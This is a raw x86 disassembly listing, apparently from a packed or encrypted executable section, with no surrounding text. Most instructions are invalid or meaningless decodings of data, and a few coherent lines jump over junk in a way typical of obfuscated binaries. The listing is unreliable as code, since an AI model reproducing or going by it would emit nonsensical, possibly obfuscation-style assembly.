  40d7da:	and    ebx,DWORD PTR [edi-0x34b034b9]
  40d7e0:	dec    ebx
  40d7e1:	jbe    0x40d83d
  40d7e3:	stos   BYTE PTR es:[edi],al
  40d7e4:	add    DWORD PTR ds:0x915cfdb8,0x5
  40d7eb:	mov    ds:0x5dd480f,eax
  40d7f0:	add    eax,0x572ae0c9
  40d7f5:	jge    0x40d86c
  40d7f7:	xchg   esi,ecx
  40d7f9:	(bad)  
  40d7fa:	jecxz  0x40d78e
  40d7fc:	bound  edx,QWORD PTR [ebx+0x310d6dee]
  40d802:	stos   DWORD PTR es:[edi],eax
  40d803:	dec    esp
  40d804:	hlt    
  40d805:	ret    
  40d806:	stc    
  40d807:	mov    esp,0xeff21694
  40d80c:	fld    TBYTE PTR [edx-0x40]
  40d80f:	push   eax
  40d810:	nop
  40d811:	sbb    ch,dh
  40d813:	icebp  
  40d814:	adc    ecx,0x4b46b94e
  40d81a:	and    eax,0x18de9d37
  40d81f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d820:	cmp    al,0xd9
  40d822:	mov    ecx,0x8b0a9217
  40d827:	repz jge 0x40d888
  40d82a:	popf   
  40d82b:	pop    ss
  40d82c:	pop    esi
  40d82d:	adc    BYTE PTR [edi+0x21],ch
  40d830:	xchg   edx,eax
  40d831:	cli    
  40d832:	mov    edx,0xcc9fa58
  40d837:	pop    es
  40d838:	inc    ebx
  40d839:	jae    0x40d7be
  40d83b:	out    0xc8,al
  40d83d:	lock ja 0x40d812
  40d840:	sub    esp,DWORD PTR [edx+edx*8+0x17]
  40d844:	or     DWORD PTR [eax-0x22b95f3e],edi
  40d84a:	mov    ds:0x915cf850,al
  40d84f:	int    0xa2
  40d851:	mov    ch,0x12
  40d853:	out    0xda,al
  40d855:	icebp  
  40d856:	xor    ah,BYTE PTR [ebx+esi*4-0x4008d39b]
  40d85d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d85e:	xor    al,0x50
  40d860:	mov    bl,BYTE PTR ds:0x372ba392
  40d866:	mov    DWORD PTR [edx+0x6f],ecx
  40d869:	rcl    ah,0x6f
  40d86c:	repz or BYTE PTR [ecx+0x4384e20e],dl
  40d873:	mov    eax,ds:0x53928995
  40d878:	enter  0x3612,0xb7
  40d87c:	add    bl,bh
  40d87e:	cwde   
  40d87f:	cmp    al,0xeb
  40d881:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d882:	add    al,BYTE PTR [esi+0x363f1749]
  40d888:	jbe    0x40d871
  40d88a:	je     0x40d871
  40d88c:	loopne 0x40d811
  40d88e:	in     al,0x43
  40d890:	arpl   WORD PTR ds:0x640ef8e2,bp
  40d896:	inc    edi
  40d897:	lods   eax,DWORD PTR ds:[esi]
  40d898:	(bad)  
  40d899:	sub    ch,BYTE PTR [edi]
  40d89b:	jecxz  0x40d906
  40d89d:	(bad)  
  40d89e:	push   edi
  40d89f:	out    dx,al
  40d8a0:	push   ecx
  40d8a1:	bnd jg 0x40d85f
  40d8a4:	fcom   DWORD PTR [eax+0x1e66aeb3]
  40d8aa:	xor    BYTE PTR [edx+0x2d],bh
  40d8ad:	mov    al,0xd2
  40d8af:	rcr    DWORD PTR [esi+0x12e492bb],cl
  40d8b5:	inc    edx
  40d8b6:	inc    ecx
  40d8b7:	cs cli 
  40d8b9:	fbstp  TBYTE PTR [ebx]
  40d8bb:	mov    ah,0x25
  40d8bd:	rol    ecx,1
  40d8bf:	jb     0x40d915
  40d8c1:	mov    bl,BYTE PTR ds:0x1a6cb99f
  40d8c7:	jmp    0x682e:0xa4b5ebd5
  40d8ce:	cwde   
  40d8cf:	xchg   BYTE PTR [ebp-0x1c8521de],bh
  40d8d5:	dec    esi
  40d8d6:	lahf   
  40d8d7:	or     eax,0x8889ff87
  40d8dc:	pop    esi
  40d8dd:	lahf   
  40d8de:	imul   ebx,DWORD PTR [esi+edi*8-0x20],0x29f55fab
  40d8e6:	mov    dh,0x83
  40d8e8:	test   eax,0xf3adad7d
  40d8ed:	cmp    esi,DWORD PTR [edi+0x66]
  40d8f0:	sti    
  40d8f1:	add    al,0xd9
  40d8f3:	mov    ebp,0x13b7dfd1
  40d8f8:	jae    0x40d898
  40d8fa:	hlt    
  40d8fb:	cmp    DWORD PTR [esi+0x2],edi
  40d8fe:	or     DWORD PTR [edx],edi
  40d900:	jns    0x40d8e9
  40d902:	jns    0x40d8e7
  40d904:	js     0x40d941
  40d906:	mov    ds:0xf660bead,al
  40d90b:	add    DWORD PTR [eax],edx
  40d90d:	jne    0x40d976
  40d90f:	sahf   
  40d910:	dec    eax
  40d911:	clc    
  40d912:	pop    ebx
  40d913:	loop   0x40d8ee
  40d915:	xor    edx,DWORD PTR gs:[ecx+0x13]
  40d919:	data16 adc BYTE PTR [eax+0x7ef6545f],ch
  40d920:	mov    ds:0x8da292fc,al
  40d925:	int3   
  40d926:	retf   
  40d927:	push   0xffffffb8
  40d929:	sub    DWORD PTR [ecx+0x73127e86],eax
  40d92f:	in     eax,dx
  40d930:	stos   DWORD PTR es:[edi],eax
  40d931:	cs cmp ch,dh
  40d934:	int    0x2a
  40d936:	ror    DWORD PTR [edi],1
  40d938:	jnp    0x40d8ff
  40d93a:	mov    bh,0xe9
  40d93c:	scas   eax,DWORD PTR es:[edi]
  40d93d:	or     eax,0xf1f54cfe
  40d942:	jge    0x40d8e1
  40d944:	xor    bh,BYTE PTR [ebp-0x2e64f3a0]
  40d94a:	mov    ds:0x8b26d643,eax
  40d94f:	add    edx,DWORD PTR es:[eax]
  40d952:	push   edi
  40d953:	cmp    esi,DWORD PTR ds:0xed11462a
  40d959:	mov    bh,0x30
  40d95b:	(bad)  
  40d95c:	pusha  
  40d95d:	mov    ecx,ebx
  40d95f:	ss dec eax
  40d961:	addr16 xor al,0x40
  40d964:	xchg   ebx,eax
  40d965:	imul   BYTE PTR [edx-0x2c]
  40d968:	js     0x40d9c2
  40d96a:	and    DWORD PTR [esi],esi
  40d96c:	inc    esi
  40d96d:	sub    DWORD PTR [edx+0x54],eax
  40d970:	popf   
  40d971:	mov    edi,0xadba86b9
  40d976:	push   cs
  40d977:	xchg   ecx,eax
  40d978:	mov    ch,ch
  40d97a:	mov    BYTE PTR [esi],dh
  40d97c:	push   0xffe5c9ee
  40d981:	retf   
  40d982:	pop    eax
  40d983:	mov    al,0x2e
  40d985:	xor    BYTE PTR [edx-0x244185ae],ah
  40d98b:	jbe    0x40d9cd
  40d98d:	cmp    eax,0xbd174385
  40d992:	and    dh,BYTE PTR [ebx]
  40d994:	or     al,0xe7
  40d996:	in     eax,dx
  40d997:	int3   
  40d998:	jmp    0xeb8e:0x3a81e1b9
  40d99f:	(bad)  
  40d9a0:	loope  0x40d96a
  40d9a2:	push   ss
  40d9a3:	lock cs xchg edi,eax
  40d9a6:	or     bh,BYTE PTR [ebx+0x130be44e]
  40d9ac:	xchg   ebp,eax
  40d9ad:	jmp    0x40d95a
  40d9af:	repnz mov eax,0xb60f5a9a
  40d9b5:	push   ebx
  40d9b6:	add    eax,0x558172c1
  40d9bb:	pop    ebp
  40d9bc:	aad    0xa6
  40d9be:	popf   
  40d9bf:	add    al,0xca
  40d9c1:	fimul  DWORD PTR ds:0xea1182a8
  40d9c7:	jnp    0x40d956
  40d9c9:	call   0xa929894
  40d9ce:	retf   
  40d9cf:	and    BYTE PTR [eax+0x34],0x5
  40d9d3:	xchg   esp,eax
  40d9d4:	mov    edx,0xdfc95d55
  40d9d9:	stos   DWORD PTR es:[edi],eax
  40d9da:	xor    DWORD PTR [esp+0x4c903ec3],ecx
  40d9e1:	cmp    al,0x23
  40d9e3:	xor    al,0xd3
  40d9e5:	ins    BYTE PTR es:[edi],dx
  40d9e6:	sub    al,BYTE PTR [ebx]
  40d9e8:	push   cs
  40d9e9:	xchg   ebp,eax
  40d9ea:	rcl    BYTE PTR [ebx-0x4749458],1
  40d9f0:	add    dl,ch
  40d9f2:	and    DWORD PTR [esi],edi
  40d9f4:	cmp    eax,0x18ac9c36
  40d9f9:	xchg   edi,eax
  40d9fa:	jg     0x40d9fd
  40d9fc:	mov    dh,0xd6
  40d9fe:	pop    ecx
  40d9ff:	cwde   
  40da00:	call   0x399bcdb9
  40da05:	ds pop edi
  40da07:	leave  
  40da08:	xor    al,0xcf
  40da0a:	sti    
  40da0b:	inc    edi
  40da0c:	into   
  40da0d:	sbb    BYTE PTR ds:0x51d505bf,cl
  40da13:	mov    dl,0x34
  40da15:	cmp    dh,BYTE PTR [ebx+ecx*4]
  40da18:	scas   eax,DWORD PTR es:[edi]
  40da19:	sub    bh,BYTE PTR [edx+0x1e365764]
  40da1f:	aad    0xfa
  40da21:	jecxz  0x40d9eb
  40da23:	cmp    al,0x98
  40da25:	test   eax,0x7e77123d
  40da2a:	inc    esi
  40da2b:	fisttp QWORD PTR [edi-0x26196f91]
  40da31:	cmp    cl,BYTE PTR [esi-0x38e38f0c]
  40da37:	scas   al,BYTE PTR es:[edi]
  40da38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da39:	icebp  
  40da3a:	inc    ecx
  40da3b:	pop    ebp
  40da3c:	imul   DWORD PTR [eax-0x40b4fdcd]
  40da42:	ins    DWORD PTR es:[edi],dx
  40da43:	mov    esi,0xb3cb4c82
  40da48:	mov    ebp,0xa6219547
  40da4d:	loop   0x40da82
  40da4f:	clc    
  40da50:	add    edx,edi
  40da52:	mov    edi,DWORD PTR [ebp-0x8]
  40da55:	lea    edx,[edx+edi*1+0x327299]
  40da5c:	jmp    0x40de73
  40da61:	outs   dx,BYTE PTR ds:[esi]
  40da62:	xlat   BYTE PTR ds:[ebx]
  40da63:	shl    BYTE PTR [ebp-0x228e4a8d],cl
  40da69:	mov    dh,0x68
  40da6b:	pop    ss
  40da6c:	out    0xbf,eax
  40da6e:	lds    esi,FWORD PTR [ebp+0x7ea23274]
  40da74:	jle    0x40dae6
  40da76:	jns    0x40daf6
  40da78:	jle    0x40da62
  40da7a:	push   esp
  40da7b:	jbe    0x40da53
  40da7d:	push   edx
  40da7e:	shl    BYTE PTR [edx-0x29],0x2f
  40da82:	sub    BYTE PTR [ebx-0x1a],ah
  40da85:	jmp    0x40da3b
  40da87:	leave  
  40da88:	and    cl,BYTE PTR [edx-0x1cbd3bd7]
  40da8e:	bound  edx,QWORD PTR [esi]
  40da90:	jo     0x40dae0
  40da92:	hlt    
  40da93:	iret   
  40da94:	popa   
  40da95:	push   ds
  40da96:	push   edx
  40da97:	adc    ch,dh
  40da99:	lods   al,BYTE PTR ds:[esi]
  40da9a:	xchg   esi,eax
  40da9b:	cmp    eax,0x867fea60
  40daa0:	jmp    0x7a064dd7
  40daa5:	cs not dh
  40daa8:	cmp    dh,BYTE PTR [esi+esi*8]
  40daab:	jmp    0x347f27e9
  40dab0:	out    0xc3,al
  40dab2:	dec    ebx
  40dab3:	(bad)  
  40dab4:	ins    BYTE PTR es:[edi],dx
  40dab5:	popf   
  40dab6:	test   al,0x71
  40dab8:	xchg   edi,eax
  40dab9:	test   eax,0x38226746
  40dabe:	xchg   ebx,eax
  40dabf:	xchg   edx,eax
  40dac0:	mov    BYTE PTR [ecx-0x8],ch
  40dac3:	arpl   di,cx
  40dac5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dac6:	js     0x40da4b
  40dac8:	stc    
  40dac9:	or     DWORD PTR [esi],esp
  40dacb:	cmp    BYTE PTR [ecx+0x20],bl
  40dace:	inc    ebp
  40dacf:	mov    WORD PTR [edx-0x8],ss
  40dad2:	jmp    0x91922543
  40dad7:	adc    dh,BYTE PTR [eax]
  40dad9:	cmp    eax,0x4e662a2f
  40dade:	sti    
  40dadf:	jbe    0x40db46
  40dae1:	out    0x7d,al
  40dae3:	sub    BYTE PTR [esi+0x302be3c0],0xa2
  40daea:	neg    esi
  40daec:	jnp    0x40db34
  40daee:	in     al,dx
  40daef:	or     esp,ebp
  40daf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daf2:	mov    dl,BYTE PTR [eax-0xd1bc9bb]
  40daf8:	or     al,0xd0
  40dafa:	ja     0x40db0c
  40dafc:	push   edx
  40dafd:	cwde   
  40dafe:	int    0xe4
  40db00:	mov    ds,WORD PTR [ebx]
  40db02:	in     eax,0xc9
  40db04:	lea    ebx,[edx-0x35]
  40db07:	jne    0x40db24
  40db09:	dec    ebx
  40db0a:	test   eax,0x6e7cbafa
  40db0f:	push   ebx
  40db10:	and    dh,bl
  40db12:	or     al,0xbc
  40db14:	pop    esp
  40db15:	stos   DWORD PTR es:[edi],eax
  40db16:	retf   0x425c
  40db19:	push   0x8d41f306
  40db1e:	fidiv  WORD PTR [ecx-0x1ac2a4c7]
  40db24:	sbb    BYTE PTR [eax-0x66d77aff],cl
  40db2a:	int3   
  40db2b:	xor    al,0xbf
  40db2d:	inc    esi
  40db2e:	ss sahf 
  40db30:	mov    bh,BYTE PTR [eax]
  40db32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db34:	shl    dh,0x10
  40db37:	in     al,dx
  40db38:	adc    eax,0x1966253a
  40db3d:	inc    ebx
  40db3e:	(bad)  
  40db40:	or     eax,0x8b4f9041
  40db45:	sbb    eax,0x4357e1a3
  40db4a:	pop    ebp
  40db4b:	push   esi
  40db4c:	push   edx
  40db4d:	ror    DWORD PTR [ecx-0x2d],0x53
  40db51:	shl    DWORD PTR [edx],0x7
  40db54:	pop    es
  40db55:	sub    eax,0x82416fb1
  40db5a:	mov    ch,0x59
  40db5c:	js     0x40db22
  40db5e:	cmp    DWORD PTR [ecx*1-0x928e0c7],ebx
  40db65:	xchg   ebx,eax
  40db66:	jl     0x40db83
  40db68:	out    dx,al
  40db69:	push   edi
  40db6a:	daa    
  40db6b:	mov    al,0x26
  40db6d:	mov    al,0x2a
  40db6f:	jl     0x40db55
  40db71:	mov    dh,0xda
  40db73:	test   ah,0x5d
  40db76:	adc    esp,DWORD PTR [edx-0x41]
  40db79:	mov    ?,WORD PTR [esi+0x4f0da8bd]
  40db7f:	xchg   ebp,eax
  40db80:	push   edx
  40db81:	iret   
  40db82:	jae    0x40dbe8
  40db84:	pop    ds
  40db85:	fisubr WORD PTR [edi-0x65]
  40db88:	test   al,0x96
  40db8a:	mov    eax,ds:0x79536d9c
  40db8f:	out    dx,eax
  40db90:	push   ss
  40db91:	ss std 
  40db93:	adc    al,0x4f
  40db95:	xor    ah,BYTE PTR [eax]
  40db97:	or     eax,0xfb711a68
  40db9c:	icebp  
  40db9d:	push   esi
  40db9e:	cdq    
  40db9f:	mov    ecx,0xf1849276
  40dba4:	fnstenv [edx-0x6f0745f1]
  40dbaa:	add    DWORD PTR [ebx-0x6a9168c4],ebp
  40dbb0:	mov    esi,0x2f6186d2
  40dbb5:	mov    edi,0xf1add99a
  40dbba:	vmread DWORD PTR [ecx],edi
  40dbbd:	test   al,0xb2
  40dbbf:	pop    ebp
  40dbc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbc1:	retf   0xcd82
  40dbc4:	je     0x40db54
  40dbc6:	std    
  40dbc7:	inc    edi
  40dbc8:	mov    ecx,0xf1ff88ab
  40dbcd:	and    BYTE PTR [eax+0x14],bl
  40dbd0:	loopne 0x40dc2d
  40dbd2:	imul   ebx,edi,0x27c7cab4
  40dbd8:	repz xor eax,0x4e2df0de
  40dbde:	or     BYTE PTR [ecx+0xfe6b661],ah
  40dbe4:	test   al,0xda
  40dbe6:	cmc    
  40dbe7:	pushf  
  40dbe8:	pop    ecx
  40dbe9:	shr    al,1
  40dbeb:	or     bl,BYTE PTR [ebp+0x38a15dcf]
  40dbf1:	loopne 0x40dbe2
  40dbf3:	jmp    0x40dc47
  40dbf5:	fstp   TBYTE PTR [ebp+ecx*4-0x7]
  40dbf9:	outs   dx,BYTE PTR ds:[esi]
  40dbfa:	jmp    0x40dbb3
  40dbfc:	fstp   TBYTE PTR [ecx-0x4a7ffec1]
  40dc02:	jl     0x40dc1a
  40dc04:	in     al,dx
  40dc05:	out    dx,al
  40dc06:	(bad)  
  40dc08:	gs jae 0x40dbd1
  40dc0b:	data16 lock ja 0x40dbb4
  40dc0f:	out    0xb3,eax
  40dc11:	lea    ebp,es:[ebp-0x611cf706]
  40dc18:	jle    0x40dbb0
  40dc1a:	mov    ds,WORD PTR [eax-0x698031b9]
  40dc20:	sub    eax,0x1458cebc
  40dc25:	jb     0x40dbbc
  40dc27:	lea    esp,[esi-0x6b]
  40dc2a:	xor    DWORD PTR [ebx-0x295a7b00],eax
  40dc30:	mov    esi,?
  40dc32:	(bad)  
  40dc33:	sbb    cl,BYTE PTR [esi-0x1226a010]
  40dc39:	repnz inc ebp
  40dc3b:	jne    0x40dc7d
  40dc3d:	imul   edi,DWORD PTR [ecx-0x2506f507],0x633643f5
  40dc47:	int    0x7
  40dc49:	sahf   
  40dc4a:	clc    
  40dc4b:	mov    esi,0x381f8619
  40dc50:	and    bl,BYTE PTR [esi+ecx*2]
  40dc53:	push   cs
  40dc54:	out    0x31,al
  40dc56:	mov    edx,0xec318447
  40dc5b:	les    ecx,FWORD PTR [edx-0x3b]
  40dc5e:	fild   QWORD PTR [esi+0x70]
  40dc61:	xor    DWORD PTR [ecx-0x1d],esp
  40dc64:	push   cs
  40dc65:	rcl    DWORD PTR [ebx-0x68],1
  40dc68:	push   es
  40dc69:	mov    ebp,0x696646f2
  40dc6e:	mov    bh,0x4d
  40dc70:	fimul  WORD PTR [ecx+0x282a2377]
  40dc76:	inc    BYTE PTR [ebx-0x265ce740]
  40dc7c:	mov    WORD PTR [eax],?
  40dc7e:	pop    edi
  40dc7f:	or     al,0x77
  40dc81:	repz jno 0x40dcb1
  40dc84:	cld    
  40dc85:	xor    dh,BYTE PTR [esi]
  40dc87:	push   ss
  40dc88:	xor    ecx,DWORD PTR [ecx]
  40dc8a:	mov    ebp,0x1662b185
  40dc8f:	sub    ebp,DWORD PTR [edi]
  40dc91:	inc    esi
  40dc92:	popf   
  40dc93:	xor    esi,DWORD PTR [edi-0x22773585]
  40dc99:	aas    
  40dc9a:	call   0xf56995d4
  40dc9f:	mov    ch,0xad
  40dca1:	mov    fs,edx
  40dca3:	xchg   DWORD PTR [eax],esp
  40dca5:	js     0x40dccf
  40dca7:	add    al,0xc
  40dca9:	imul   eax,DWORD PTR [ebp+0x7c5a81ff],0x56
  40dcb0:	or     ch,BYTE PTR [ebx+eax*8-0x4d]
  40dcb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcb5:	hlt    
  40dcb6:	nop
  40dcb7:	in     al,0x67
  40dcb9:	icebp  
  40dcba:	int3   
  40dcbb:	out    0x60,eax
  40dcbd:	push   ebp
  40dcbe:	ds jnp 0x40dcac
  40dcc1:	popa   
  40dcc2:	aaa    
  40dcc3:	hlt    
  40dcc4:	mov    ebx,0xb7f5bef1
  40dcc9:	sahf   
  40dcca:	shl    BYTE PTR [esp+eax*4-0x33ff01f6],0x89
  40dcd2:	pop    eax
  40dcd3:	push   esi
  40dcd4:	push   0x65
  40dcd6:	std    
  40dcd7:	mov    dh,0xa7
  40dcd9:	sub    ch,BYTE PTR [edx+0xb]
  40dcdc:	xchg   ecx,eax
  40dcdd:	jb     0x40dce6
  40dcdf:	int    0xfb
  40dce1:	jl     0x40dcb1
  40dce3:	ins    DWORD PTR es:[edi],dx
  40dce4:	pushf  
  40dce5:	out    dx,al
  40dce6:	in     eax,0xd3
  40dce8:	adc    dh,dh
  40dcea:	jo     0x40dd46
  40dcec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dced:	loopne 0x40dcd1
  40dcef:	dec    eax
  40dcf0:	inc    ebx
  40dcf1:	mul    edx
  40dcf3:	sub    BYTE PTR [esi],bh
  40dcf5:	pusha  
  40dcf6:	fmul   QWORD PTR [edx+esi*2-0x25]
  40dcfa:	xor    al,0x33
  40dcfc:	test   DWORD PTR [edi],ebx
  40dcfe:	(bad)  
  40dcff:	ins    DWORD PTR es:[edi],dx
  40dd00:	push   ss
  40dd01:	dec    DWORD PTR [ebp-0x5d]
  40dd04:	out    dx,eax
  40dd05:	stc    
  40dd06:	cmp    dh,BYTE PTR [edi-0x77d85399]
  40dd0c:	mov    edx,0x4a80ff8e
  40dd11:	push   esi
  40dd12:	inc    ebp
  40dd13:	sbb    eax,0xe982d273
  40dd18:	retf   0xe18d
  40dd1b:	push   ss
  40dd1c:	add    dh,BYTE PTR [ebx]
  40dd1e:	mov    BYTE PTR [ebx-0x42110332],ch
  40dd24:	or     al,0xc1
  40dd26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd27:	mov    ds:0x33590455,al
  40dd2c:	(bad)  
  40dd2d:	fwait
  40dd2e:	leave  
  40dd2f:	jb     0x40dcb7
  40dd31:	test   BYTE PTR [ecx],ch
  40dd33:	mov    bh,bl
  40dd35:	aaa    
  40dd36:	pop    eax
  40dd37:	jne    0x40dce8
  40dd39:	sbb    eax,0x9103d718
  40dd3f:	not    DWORD PTR [ebp+0x541569dd]
  40dd45:	bound  ebx,QWORD PTR [ecx+eiz*8]
  40dd48:	aad    0xba
  40dd4a:	out    0x1,al
  40dd4c:	cli    
  40dd4d:	add    BYTE PTR ds:0x4ec9462e,bh
  40dd53:	adc    esi,DWORD PTR [ebx-0x7b]
  40dd56:	inc    edx
  40dd57:	daa    
  40dd58:	sbb    eax,0xc4cfc202
  40dd5d:	or     ah,al
  40dd5f:	fisttp DWORD PTR [ebx+0x68]
  40dd62:	test   DWORD PTR [edx],ecx
  40dd64:	cwde   
  40dd65:	rcl    DWORD PTR [ebp-0xb876f4a],cl
  40dd6b:	xor    BYTE PTR [esp+edi*8+0x3],bl
  40dd6f:	aas    
  40dd70:	inc    eax
  40dd71:	mov    ds,WORD PTR [edi-0x3b]
  40dd74:	test   al,0xea
  40dd76:	xor    ch,bh
  40dd78:	sbb    ebp,edx
  40dd7a:	xor    eax,0xbc0e697e
  40dd7f:	push   esi
  40dd80:	lea    edi,gs:[ecx]
  40dd83:	inc    edx
  40dd84:	sub    eax,0xca7451a4
  40dd89:	push   ss
  40dd8a:	loopne 0x40ddf4
  40dd8c:	cld    
  40dd8d:	sbb    ah,BYTE PTR [edx]
  40dd8f:	or     edi,DWORD PTR [ebp+0x1f]
  40dd92:	(bad)  
  40dd94:	pop    ds
  40dd95:	ret    
  40dd96:	push   ecx
  40dd97:	pop    edx
  40dd98:	xlat   BYTE PTR ds:[ebx]
  40dd99:	cdq    
  40dd9a:	(bad)  
  40dd9c:	mov    al,0x30
  40dd9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd9f:	inc    esp
  40dda0:	mov    eax,ds:0x315f0b47
  40dda5:	adc    BYTE PTR [edx+0x1c],dh
  40dda8:	sti    
  40dda9:	adc    dh,BYTE PTR ds:0xc00b2371
  40ddaf:	lock pop ss
  40ddb1:	iret   
  40ddb2:	jl     0x40dd53
  40ddb4:	inc    ecx
  40ddb5:	arpl   WORD PTR [ebx+0x69486bde],dx
  40ddbb:	sub    DWORD PTR [edi-0x71],ecx
  40ddbe:	scas   eax,DWORD PTR es:[edi]
  40ddbf:	jno    0x40de20
  40ddc1:	ret    
  40ddc2:	data16 out dx,al
  40ddc4:	jle    0x40de3a
  40ddc6:	push   ebp
  40ddc7:	push   es
  40ddc8:	sub    DWORD PTR [ebp+edx*4-0x10],0x1b
  40ddcd:	dec    esp
  40ddce:	jae    0x40de12
  40ddd0:	add    eax,0x78536350
  40ddd5:	ret    0x4a84
  40ddd8:	pop    eax
  40ddd9:	fmul   DWORD PTR [edx]
  40dddb:	loopne 0x40de56
  40dddd:	xchg   ebx,eax
  40ddde:	mov    esp,0x211f8d3d
  40dde3:	pop    ebx
  40dde4:	add    esp,0x6c8c9dd8
  40ddea:	push   cs
  40ddeb:	setle  BYTE PTR [ebp-0x80]
  40ddef:	and    ecx,DWORD PTR [ecx+0x26ffbc92]
  40ddf5:	cdq    
  40ddf6:	in     eax,0x6b
  40ddf8:	stos   DWORD PTR es:[edi],eax
  40ddf9:	sub    al,0x7a
  40ddfb:	and    ecx,0xe1b3a87d
  40de01:	mov    bh,0x2d
  40de03:	mov    esi,edi
  40de05:	in     eax,0x45
  40de07:	jecxz  0x40de23
  40de09:	jmp    0x81103b65
  40de0e:	and    eax,0xd1fb9fe7
  40de13:	aaa    
  40de14:	mov    eax,0xd0965eaf
  40de19:	bound  esi,QWORD PTR [ebp-0x12f39470]
  40de1f:	mov    ah,0xab
  40de21:	outs   dx,BYTE PTR ds:[esi]
  40de22:	or     BYTE PTR [esi+ebx*1-0xafa84d],ah
  40de29:	xor    eax,0x145eb208
  40de2e:	int    0xa1
  40de30:	xor    eax,0x2a34ce85
  40de35:	fsubp  st(4),st
  40de37:	mul    bl
  40de39:	loop   0x40ddfa
  40de3b:	inc    eax
  40de3c:	enter  0x615a,0xf5
  40de40:	shl    edi,1
  40de42:	repz sbb ebp,esi
  40de45:	imul   esi,DWORD PTR [ebx-0x74],0x249470f1
  40de4c:	push   edx
  40de4d:	sahf   
  40de4e:	fnstenv [edx-0x61]
  40de51:	adc    eax,0x10c6b1cc
  40de56:	add    esp,edx
  40de58:	mov    DWORD PTR [esi],ecx
  40de5a:	push   edx
  40de5b:	jb     0x40de09
  40de5d:	dec    ecx
  40de5e:	outs   dx,DWORD PTR ds:[esi]
  40de5f:	adc    eax,0xd04e13ca
  40de64:	jp     0x40dea2
  40de66:	loope  0x40de39
  40de68:	pop    es
  40de69:	test   eax,0x9ffcda09
  40de6e:	mov    dh,0xe8
  40de70:	sub    eax,edx
  40de72:	pop    ss
  40de73:	mov    DWORD PTR [ebp-0x8],edx
  40de76:	mov    edx,DWORD PTR [ebp-0x20]
  40de79:	xor    edx,eax
  40de7b:	mov    edi,0xffcd8d67
  40de80:	jmp    0x40e297
  40de85:	sahf   
  40de86:	call   0xb371:0x5de417d8
  40de8d:	adc    al,0xe5
  40de8f:	and    DWORD PTR [edx],edx
  40de91:	jge    0x40df0f
  40de93:	sub    ch,dl
  40de95:	xor    al,0xae
  40de97:	jle    0x40df17
  40de99:	jo     0x40df14
  40de9b:	jle    0x40df1b
  40de9d:	idiv   bl
  40de9f:	mov    ebx,0x42a008d4
  40dea4:	jmp    0xe6683114
  40dea9:	shl    BYTE PTR [edi+0x7deba663],1
  40deaf:	fwait
  40deb0:	(bad)  
  40deb2:	push   ecx
  40deb3:	pop    eax
  40deb4:	xchg   ecx,eax
  40deb5:	push   eax
  40deb6:	adc    al,0x86
  40deb8:	addr16 (bad) 
  40deba:	fs cmp edx,edx
  40debd:	fsubr  DWORD PTR [ebx-0x3c5a7650]
  40dec3:	pop    edx
  40dec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dec5:	icebp  
  40dec6:	mov    ebp,0x840df727
  40decb:	mov    eax,0xd577905f
  40ded0:	loop   0x40df15
  40ded2:	push   cs
  40ded3:	lods   al,BYTE PTR ds:[esi]
  40ded4:	jae    0x40dee1
  40ded6:	lds    ecx,FWORD PTR [edi-0x79f97e06]
  40dedc:	test   BYTE PTR [edi+0x4b],bh
  40dedf:	mov    esp,0x250d0267
  40dee4:	fstp   DWORD PTR [edi+edi*8+0x5d]
  40dee8:	inc    BYTE PTR [edx+0x4f]
  40deeb:	mov    fs,WORD PTR [esi-0x7ea330b3]
  40def1:	retf   0xae06
  40def4:	push   ebp
  40def5:	mov    WORD PTR [ebx],es
  40def7:	mov    al,0x71
  40def9:	sbb    BYTE PTR [ebx-0x60a8ce52],bl
  40deff:	push   cs
  40df00:	popa   
  40df01:	inc    ecx
  40df02:	loop   0x40df45
  40df04:	or     DWORD PTR [edi],ebp
  40df06:	nop
  40df07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df08:	fs cld 
  40df0a:	and    esp,DWORD PTR [edi]
  40df0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df0d:	nop
  40df0e:	test   al,0xa1
  40df10:	xchg   esi,eax
  40df11:	fstp   QWORD PTR [ecx-0x2bf1664]
  40df17:	push   esp
  40df18:	aam    0xfa
  40df1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df1b:	lea    ecx,[esi]
  40df1d:	aad    0x50
  40df1f:	xchg   ecx,eax
  40df20:	cmp    ebx,DWORD PTR [eax+0x6e]
  40df23:	mov    dl,bh
  40df25:	sti    
  40df26:	add    DWORD PTR ds:0xfac1fcac,0xccbd3a
  40df30:	jnp    0x40df7d
  40df32:	or     eax,0xe06c8f9
  40df37:	pusha  
  40df38:	outs   dx,DWORD PTR ds:[esi]
  40df39:	or     bh,BYTE PTR [ecx+0x35439da2]
  40df3f:	mov    cl,BYTE PTR [edi+0x1e]
  40df42:	pop    eax
  40df43:	pop    ds
  40df44:	ret    0x7d52
  40df47:	cmp    al,0xc8
  40df49:	(bad)  
  40df4a:	test   al,0x4c
  40df4c:	jp     0x40df03
  40df4e:	sub    al,0x85
  40df50:	xor    ch,0xd2
  40df53:	gs inc edi
  40df55:	xor    ch,BYTE PTR [edi-0x46676363]
  40df5b:	test   eax,0xa004fc38
  40df60:	xchg   ecx,eax
  40df61:	push   es
  40df62:	popa   
  40df63:	mov    ds:0xd29aa669,eax
  40df68:	mov    esi,DWORD PTR [edx+0x4730d11a]
  40df6e:	les    eax,FWORD PTR [edx+edx*4+0x38]
  40df72:	cmc    
  40df73:	les    ebp,FWORD PTR [ebp-0x528473f0]
  40df79:	dec    ebp
  40df7a:	mov    dl,0xb4
  40df7c:	xchg   dh,dl
  40df7e:	xor    DWORD PTR [esi],0xcaeedafb
  40df84:	cdq    
